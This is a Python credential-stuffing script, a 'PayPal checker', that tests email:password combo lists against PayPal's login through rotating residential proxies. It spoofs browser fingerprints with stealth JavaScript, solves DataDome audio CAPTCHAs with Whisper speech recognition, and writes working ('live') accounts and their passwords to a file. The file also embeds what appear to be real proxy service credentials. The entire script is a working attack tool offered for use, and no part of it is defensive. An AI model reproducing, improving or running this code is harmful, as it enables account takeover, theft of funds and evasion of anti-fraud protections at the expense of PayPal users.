#!/usr/bin/env python3
"""ULTIMATE PAYPAL CHECKER v3.1 — FIXED: dd.t extraction + French Whisper digits"""
import asyncio, re, sys, random, os
from urllib.parse import quote
from pathlib import Path

HEADLESS = os.environ.get("HEADLESS", "true").lower() == "true"

CHECKOUT_URL = (
    "https://www.paypal.com/checkoutnow"
    "?token=EC-2CM292865A548433E"
    "&sessionID=f8130d64-de5a-4325-8022-cc80ee49b8a1"
    "&buyerCountry=FR&locale.x=fr_FR"
)

PROXIES = [
    {"server": "http://prod-proxy.geonode.io:9000", "username": "geonode_kCP1DJHBOT-type-residential-country-fr", "password": "d55d2bd5-8d2c-493f-9507-69b4cf7af095", "country": "fr"},
    {"server": "http://us.proxy.geonode.io:9000", "username": "geonode_kCP1DJHBOT-type-residential-country-us", "password": "d55d2bd5-8d2c-493f-9507-69b4cf7af095", "country": "us"},
    {"server": "http://proxy.geonode.io:9000", "username": "geonode_kCP1DJHBOT-type-residential", "password": "d55d2bd5-8d2c-493f-9507-69b4cf7af095", "country": "unknown"},
]

PROXY_REQUESTS = {
    "http": "http://geonode_kCP1DJHBOT-type-residential-country-fr:d55d2bd5-8d2c-493f-9507-69b4cf7af095@prod-proxy.geonode.io:9000",
    "https": "http://geonode_kCP1DJHBOT-type-residential-country-fr:d55d2bd5-8d2c-493f-9507-69b4cf7af095@prod-proxy.geonode.io:9000",
}

FINGERPRINTS = {
    "fr": {"timezone": "Europe/Paris", "locale": "fr-FR", "languages": ["fr-FR", "fr", "en-US", "en"], "viewport": {"width": 1920, "height": 1080}},
    "us": {"timezone": "America/New_York", "locale": "en-US", "languages": ["en-US", "en"], "viewport": {"width": 1920, "height": 1080}},
}

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
]

# French number words → digits mapping for Whisper correction
FR_NUMBERS = {
    "zéro": "0", "un": "1", "deux": "2", "trois": "3", "quatre": "4",
    "cinq": "5", "six": "6", "sept": "7", "huit": "8", "neuf": "9",
    "zero": "0", "one": "1", "two": "2", "three": "3", "four": "4",
    "five": "5", "seven": "7", "eight": "8", "nine": "9", "ten": "10",
}

def extract_digits(text):
    """Extract digits from Whisper transcription, handling French number words."""
    print(f"  [DD] Raw text: '{text.strip()}'")
    
    # First try: find isolated digits in the text (most common pattern)
    # Look for patterns like "6. 8. 6. 1. 5. 3." or "6, 8, 6, 1, 5, 3"
    digit_matches = re.findall(r'\b(\d)\b', text)
    if len(digit_matches) >= 4:
        digits = ''.join(digit_matches[:6])
        print(f"  [DD] Pattern digits: '{digits}'")
        return digits
    
    # Second try: convert French number words
    text_lower = text.lower()
    # Replace number words with digits
    for word, digit in sorted(FR_NUMBERS.items(), key=lambda x: -len(x[0])):
        text_lower = text_lower.replace(word, digit)
    
    # Extract all digits
    all_digits = re.sub(r'[^0-9]', '', text_lower)
    if len(all_digits) >= 4:
        # Take first 6 digits after the phrase "chiffres" or "numbers"
        phrase_match = re.search(r'(?:chiffres|numbers|entendez|hear)[^0-9]*(\d+)', text_lower)
        if phrase_match:
            digits = phrase_match.group(1)[:6]
            print(f"  [DD] Phrase digits: '{digits}'")
            return digits
        digits = all_digits[:6]
        print(f"  [DD] All digits: '{digits}'")
        return digits
    
    return all_digits[:6]


STEALTH_JS = """
(function() {
    Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
    window.chrome = {runtime: {}, loadTimes: function(){}, csi: function(){}};
    Object.defineProperty(navigator, 'plugins', {get: () => {
        const p = [{name:'Chrome PDF Plugin',filename:'internal-pdf-viewer'}];
        p.item=i=>p[i];p.namedItem=n=>p.find(x=>x.name===n);p.refresh=()=>{};return p;
    }});
    Object.defineProperty(navigator, 'hardwareConcurrency', {get: () => 8});
    Object.defineProperty(navigator, 'deviceMemory', {get: () => 8});
    Object.defineProperty(screen, 'colorDepth', {get: () => 24});
    const oq = navigator.permissions.query;
    navigator.permissions.query = p => p.name==='notifications'?Promise.resolve({state:'prompt'}):oq(p);
    const gp = WebGLRenderingContext.prototype.getParameter;
    WebGLRenderingContext.prototype.getParameter = function(p) {
        if(p===37445)return'Google Inc. (Intel)';if(p===37446)return'ANGLE (Intel, UHD Graphics 620)';return gp.call(this,p);
    };
})();
"""


async def bypass_datadome(page, model):
    try:
        content = await page.content()
        if "var dd=" not in content and "datadome" not in content.lower():
            return True
        
        print("  [DD] Challenge detected, extracting params...")
        
        # FIXED: use regex on page source instead of evaluate (dd might not be global)
        dd = {}
        dd['cid'] = re.search(r"'cid'\s*:\s*'([^']+)'", content)
        dd['hsh'] = re.search(r"'hsh'\s*:\s*'([^']+)'", content)
        dd['t'] = re.search(r"'t'\s*:\s*'([^']+)'", content)
        dd['s'] = re.search(r"'s'\s*:\s*(\d+)", content)
        dd['host'] = re.search(r"'host'\s*:\s*'([^']+)'", content)
        dd['cookie'] = re.search(r"'cookie'\s*:\s*'([^']+)'", content)
        
        # Convert matches to values
        for k in dd:
            if dd[k]:
                dd[k] = dd[k].group(1)
        if not dd['cid'] or not dd['hsh']:
            dd['cid'] = dd['cid'] or ''
            dd['hsh'] = dd['hsh'] or ''
            # Try evaluate as fallback
            try:
                dd2 = await page.evaluate("""() => {
                    if (typeof dd === 'undefined') return null;
                    return {cid:dd.cid||'', hsh:dd.hsh||'', t:dd.t||'fe', s:dd.s||'', host:dd.host||'', cookie:dd.cookie||''};
                }""")
                if dd2:
                    dd.update(dd2)
            except:
                pass
        
        if not dd.get('cid'):
            print("  [DD] Could not extract params")
            return False
        
        print(f"  [DD] t={dd.get('t','fe')}, host={dd.get('host','')}")
        
        if dd.get('t') == 'bv':
            print("  [DD] IP BANNED (t=bv)!")
            return False
        
        # Build captcha URL
        captcha_url = (
            f"https://{dd['host']}/captcha/?"
            f"initialCid={quote(dd['cid'])}&hash={dd['hsh']}"
            f"&cid={quote(dd['cookie'])}&t={dd.get('t','fe')}"
            f"&referer={quote('https://www.paypal.com/signin')}"
            f"&s={dd.get('s','')}&dm=cd"
        )
        
        print("  [DD] Loading captcha page...")
        await page.goto(captcha_url, wait_until="domcontentloaded", timeout=30000)
        await asyncio.sleep(3)
        
        print("  [DD] Switching to audio...")
        audio_btn = await page.query_selector("#captcha__audio__button")
        if not audio_btn:
            print("  [DD] No audio button")
            return False
        
        await audio_btn.click()
        await asyncio.sleep(3)
        
        audio_url = await page.evaluate("""() => {
            const a = document.querySelector('audio');
            return a ? (a.src || a.currentSrc) : null;
        }""")
        
        if not audio_url:
            print("  [DD] No audio URL")
            return False
        
        print(f"  [DD] Downloading audio...")
        import requests as req
        resp = req.get(audio_url, timeout=90, proxies=PROXY_REQUESTS)
        audio_path = "/tmp/dd_audio.wav"
        with open(audio_path, "wb") as f:
            f.write(resp.content)
        
        print(f"  [DD] Transcribing {len(resp.content)} bytes with Whisper...")
        
        # Try French first (PayPal FR uses French audio)
        segments, _ = model.transcribe(audio_path, language="fr", beam_size=5)
        text = " ".join([s.text.strip() for s in segments])
        digits = extract_digits(text)
        
        # If not enough digits, try English
        if len(digits) < 4:
            segments, _ = model.transcribe(audio_path, language="en", beam_size=5)
            text = " ".join([s.text.strip() for s in segments])
            digits = extract_digits(text)
        
        if len(digits) < 4:
            print(f"  [DD] Not enough digits: {digits}")
            return False
        
        print(f"  [DD] Final digits: '{digits}'")
        
        # Fill inputs
        selectors = ["input.audio-captcha-inputs", "input[type=text]", "#captcha__audio__input input"]
        inputs = []
        for sel in selectors:
            inputs = await page.query_selector_all(sel)
            if inputs:
                break
        
        print(f"  [DD] Found {len(inputs)} input fields")
        
        if len(inputs) >= 4:
            for i in range(min(len(inputs), len(digits), 6)):
                await inputs[i].click()
                await asyncio.sleep(0.05)
                await inputs[i].fill("")
                await inputs[i].type(digits[i], delay=25)
            
            await asyncio.sleep(0.5)
            await page.keyboard.press("Enter")
            print("  [DD] Submitted - waiting for redirect...")
            
            await asyncio.sleep(6)
            
            content = await page.content()
            url = page.url
            
            if "login_email" in content or "checkoutnow" in url:
                print("  [DD] ✅ BYPASSED!")
                return True
            elif "datadome" in content.lower():
                print("  [DD] ❌ Still blocked")
                return False
            else:
                print(f"  [DD] State: {url[:80]}")
                return "login_email" in content or "checkout" in url.lower()
        else:
            print(f"  [DD] Not enough inputs ({len(inputs)})")
            return False
            
    except Exception as e:
        print(f"  [DD] Error: {e}")
        return False


async def test_account(page, email, password):
    try:
        await page.goto(CHECKOUT_URL, wait_until="domcontentloaded", timeout=30000)
        await asyncio.sleep(3)
    except Exception as e:
        return email, "NAV_ERR", str(e)[:50]
    
    content = await page.content()
    
    if "login_email" not in content and "checkoutnow" in page.url:
        if any(w in content.lower() for w in ["pay", "confirm", "continue", "checkout"]):
            return email, "SESSION_ACTIVE", page.url[:60]
    
    email_sel = 'input[name="login_email"], input#email, input[type="email"]'
    email_input = await page.query_selector(email_sel)
    if not email_input:
        return email, "NO_FORM", f"HTML:{len(content)}b"
    
    await email_input.click()
    await asyncio.sleep(random.uniform(0.2, 0.4))
    await email_input.fill("")
    for char in email:
        await email_input.type(char, delay=random.randint(30, 100))
    
    await asyncio.sleep(random.uniform(0.4, 1.0))
    
    btn = await page.query_selector('#btnNext, button[type="submit"]')
    if btn: await btn.click()
    else: await email_input.press("Enter")
    
    await asyncio.sleep(4)
    content = await page.content()
    
    if "captcha" in content.lower() or "recaptcha" in content.lower():
        return email, "CAPTCHA", ""
    
    if "login_password" in content:
        pass_sel = 'input[name="login_password"], input#password, input[type="password"]'
        pass_input = await page.query_selector(pass_sel)
        if not pass_input:
            return email, "NO_PW_FIELD", str(len(content))
        
        await pass_input.click()
        await asyncio.sleep(random.uniform(0.2, 0.4))
        await pass_input.fill("")
        for char in password:
            await pass_input.type(char, delay=random.randint(30, 100))
        
        await asyncio.sleep(random.uniform(0.3, 0.7))
        
        btn2 = await page.query_selector('#btnLogin, button[type="submit"]')
        if btn2: await btn2.click()
        else: await pass_input.press("Enter")
        
        await asyncio.sleep(5)
        content = await page.content()
        url = page.url
        
        if "password was incorrect" in content.lower() or "incorrect" in content.lower():
            return email, "LIVE_WRONG_PASS", ""
        elif "verify" in content.lower() and ("code" in content.lower() or "2fa" in content.lower()):
            return email, "LIVE_2FA", ""
        elif "checkoutnow" in url and any(w in content.lower() for w in ["pay", "confirm", "continue"]):
            return email, "LIVE_CHECKOUT", url[:60]
        elif "wallet" in url or "myaccount" in url or "summary" in url:
            return email, "LIVE_LOGGEDIN", url[:60]
        elif "security" in content.lower() or "unusual" in content.lower():
            return email, "LIVE_SECCHECK", ""
        elif "captcha" in content.lower():
            return email, "LIVE_CAPTCHA", ""
        else:
            return email, f"UNKNOWN", url[:50]
    
    elif "couldn't" in content.lower() or "doesn't exist" in content.lower():
        return email, "NO_ACCOUNT", ""
    else:
        return email, f"UNK_EMAIL", str(len(content))


async def run(accounts_file):
    from playwright.async_api import async_playwright
    from faster_whisper import WhisperModel
    
    accounts = []
    with open(accounts_file, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            line = line.strip()
            if ":" in line and ("@" in line or line.split(":")[0].isdigit()):
                parts = line.split(":", 1)
                e, p = parts[0].strip(), parts[1].strip()
                if e and p and not p.startswith("[fail]") and p not in ("PASS:", "*none*", "[NOT_SAVED]"):
                    accounts.append((e, p))
    
    print(f"""
╔══════════════════════════════════════╗
║  ULTIMATE CHECKER v3.1 - FIXED     ║
║  Accounts: {len(accounts):<24} ║
║  Mode: {'Headless' if HEADLESS else 'Headed':<26} ║
║  DataDome: Audio+Whisper bypass    ║
╚══════════════════════════════════════╝
""")
    
    print("Loading Whisper model (tiny)...")
    model = WhisperModel("tiny", device="cpu", compute_type="int8")
    print("Ready.\n")
    
    async with async_playwright() as p:
        live_accounts = []
        
        for i, (email, password) in enumerate(accounts):
            proxy_idx = i % len(PROXIES)
            proxy_cfg = {
                "server": PROXIES[proxy_idx]["server"],
                "username": PROXIES[proxy_idx]["username"],
                "password": PROXIES[proxy_idx]["password"],
            }
            country = PROXIES[proxy_idx].get("country", "fr")
            fp = FINGERPRINTS.get(country, FINGERPRINTS["fr"])
            ua = random.choice(USER_AGENTS)
            
            browser = await p.chromium.launch(
                headless=HEADLESS,
                args=["--no-sandbox", "--disable-dev-shm-usage", "--disable-blink-features=AutomationControlled",
                      "--use-gl=swiftshader", "--enable-webgl", "--ignore-gpu-blocklist", "--disable-webrtc"],
            )
            
            context = await browser.new_context(
                viewport=fp["viewport"], user_agent=ua,
                locale=fp["locale"], timezone_id=fp["timezone"],
                proxy=proxy_cfg,
            )
            
            await context.add_init_script(STEALTH_JS)
            page = await context.new_page()
            
            await page.set_extra_http_headers({
                "Accept-Language": f"{fp['locale']},{','.join(fp['languages'][1:3])};q=0.9",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            })
            
            print(f"\n[{i+1}/{len(accounts)}] {email}")
            print(f"  Proxy: {PROXIES[proxy_idx]['server'].split('://')[1].split('.')[0]}.geonode ({country})")
            
            await page.goto("https://www.paypal.com/signin?locale.x=fr_FR",
                           wait_until="domcontentloaded", timeout=30000)
            await asyncio.sleep(2)
            
            dd_bypassed = await bypass_datadome(page, model)
            if not dd_bypassed:
                print("  ❌ DataDome could not be bypassed")
                await context.close()
                await browser.close()
                continue
            
            result = await test_account(page, email, password)
            
            icons = {"LIVE_CHECKOUT": "🎯", "LIVE_LOGGEDIN": "🎯", "LIVE_2FA": "💳",
                     "LIVE_WRONG_PASS": "🔑", "LIVE_SECCHECK": "🛡️", "LIVE_CAPTCHA": "🤖",
                     "NO_ACCOUNT": "❌", "NO_FORM": "❓", "CAPTCHA": "🤖", "NAV_ERR": "☠️", "SESSION_ACTIVE": "⚡"}
            icon = icons.get(result[1], "❓")
            print(f"  {icon} {result[1]}: {result[2][:50]}")
            
            if result[1] in ("LIVE_CHECKOUT", "LIVE_LOGGEDIN", "LIVE_2FA"):
                live_accounts.append((email, password, result[1], result[2]))
            
            with open("paypal_results.txt", "a", encoding="utf-8") as f:
                f.write(f"{email}|{result[1]}|{result[2]}\n")
            
            await context.close()
            await browser.close()
            
            if i < len(accounts) - 1:
                await asyncio.sleep(random.uniform(1, 3))
        
        print(f"""
╔══════════════════════════════════════╗
║  RESULTS                            ║
║  Tested: {len(accounts):<26} ║
║  LIVE:   {len(live_accounts):<26} ║
╚══════════════════════════════════════╝
""")
        if live_accounts:
            print("✅ LIVE ACCOUNTS:")
            for e, p, s, d in live_accounts:
                print(f"  {e}:{p} [{s}]")
            with open("paypal_live.txt", "w", encoding="utf-8") as f:
                for e, p, s, d in live_accounts:
                    f.write(f"{e}:{p} | {s}\n")


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(__doc__)
        sys.exit(1)
    asyncio.run(run(sys.argv[1]))
